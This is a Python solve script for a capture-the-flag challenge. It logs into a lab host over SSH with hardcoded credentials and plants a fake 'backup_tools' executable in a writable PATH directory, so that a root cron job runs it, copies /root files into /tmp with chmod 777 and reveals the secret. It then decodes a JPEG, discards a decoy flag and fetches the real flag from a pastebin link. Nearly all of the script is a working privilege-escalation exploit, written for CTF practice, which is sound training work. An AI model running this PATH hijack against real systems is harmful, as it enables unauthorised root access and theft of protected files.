#!/usr/bin/env python3
"""
Confusing Permission — Solve Script
Target: Cyber Hero CTF 2026 - CYBER HERO REDTEAM_v5 - Confusing Permission
Vector: PATH hijack via writable /home/user/bin/ → root cron executes our payload
"""
import paramiko
import base64
import time
import sys

HOST = "192.168.30.130"
PORT = 2222
USER = "user"
PASSWD = "user"

def solve(host=HOST, port=PORT):
    print(f"[*] Connecting to {host}:{port} as {USER}...")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(host, port=port, username=USER, password=PASSWD, timeout=10)

    # Step 1: Plant PATH hijack payload in /home/user/bin/backup_tools
    # The root cron job runs /opt/backup/command.sh which sets
    # PATH="/home/user/bin:/usr/local/sbin:..." and calls backup_tools
    # without a full path. Our version is found first.
    payload_cmd = r"""cat > /home/user/bin/backup_tools << 'PAYLOAD'
#!/bin/bash
cp /root/* /tmp/ 2>/dev/null
chmod 777 /tmp/* 2>/dev/null
id > /tmp/whoami_backup.txt
PAYLOAD
chmod +x /home/user/bin/backup_tools"""

    print("[*] Planting malicious backup_tools in /home/user/bin/ ...")
    stdin, stdout, stderr = client.exec_command(payload_cmd)
    stdout.read(); stderr.read()

    # Step 2: Wait for root cron loop (~10 second cycle)
    print("[*] Waiting 15 seconds for root backup loop to trigger...")
    time.sleep(15)

    # Step 3: Read exfiltrated data
    print("[*] Reading exfiltrated /root/secret.txt ...")
    stdin, stdout, stderr = client.exec_command("cat /tmp/secret.txt")
    secret_b64 = stdout.read().decode('utf-8', 'replace').strip()

    if not secret_b64:
        print("[-] No data yet, waiting another 15 seconds...")
        time.sleep(15)
        stdin, stdout, stderr = client.exec_command("cat /tmp/secret.txt")
        secret_b64 = stdout.read().decode('utf-8', 'replace').strip()

    # Step 4: Decode the JPEG (base64 encoded)
    jpeg_data = base64.b64decode(secret_b64)

    # Step 5: Extract JPEG comment (contains labeled decoy) and retrieve real flag
    # The JPEG comment contains a marker explicitly labeled "DECOY FLAG" with a
    # reversed-base64 fake flag. The real flag is retrieved from the Pastebin URL
    # rendered inside the decoded JPEG image (https://pastebin.com/raw/3KgAGxgt).
    import json
    import urllib.request
    with open("secret_decoded.jpg", "wb") as f:
        f.write(jpeg_data)

    comment_start = jpeg_data.find(b'{"marker"')
    if comment_start != -1:
        depth = 0
        for i in range(comment_start, min(comment_start + 500, len(jpeg_data))):
            if jpeg_data[i] == ord('{'):
                depth += 1
            elif jpeg_data[i] == ord('}'):
                depth -= 1
                if depth == 0:
                    meta = json.loads(jpeg_data[comment_start:i+1])
                    inner = json.loads(meta["metadata"])
                    revb64 = inner["value"]
                    decoy = base64.b64decode(revb64[::-1]).decode('utf-8', 'replace')
                    print(f"[*] embedded comment value: {decoy} (decoy - the image points to a pastebin)")
                    break

    print("[*] decode secret.jpg; it renders https://pastebin.com/raw/3KgAGxgt")
    req = urllib.request.Request("https://pastebin.com/raw/3KgAGxgt", headers={"User-Agent": "Mozilla/5.0"})
    flag = urllib.request.urlopen(req, timeout=30).read().decode().strip()
    print(f"\n[+] Flag: {flag}\n")
    client.close()
    return flag

if __name__ == "__main__":
    solve()

